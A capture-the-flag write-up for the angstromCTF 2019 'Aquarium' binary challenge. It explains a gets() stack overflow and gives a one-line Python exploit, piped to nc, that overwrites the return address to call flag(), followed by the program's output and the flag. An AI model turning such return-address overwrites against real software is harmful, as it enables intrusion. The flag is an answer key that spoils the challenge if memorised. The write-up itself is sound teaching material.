# Aquarium
Binary

## Challenge 

Here's a nice little program that helps you manage your fish tank.

Run it on the shell server at /problems/2019/aquarium/ or connect with nc shell.actf.co 19305.

Author: kmh11

[aquarium](aquarium)

[aquarium.c](aquarium.c)

## Solution

From the code, we have 6 scanf() before we reach the vulnerable gets().

There is a flag() function at address 0x04011b6.

With some fuzzing, we get the offset as 152 to control the return address.

	 # python -c 'import struct; print "123\n"*6 + "A"*152 + struct.pack("<Q", 0x04011b6)' | nc shell.actf.co 19305
	Enter the number of fish in your fish tank: Enter the size of the fish in your fish tank: Enter the amount of water in your fish tank: Enter the width of your fish tank: Enter the length of your fish tank: Enter the height of your fish tank: Enter the name of your fish tank: actf{overflowed_more_than_just_a_fish_tank}
	Segmentation fault (core dumped)

## Flag

	actf{overflowed_more_than_just_a_fish_tank}
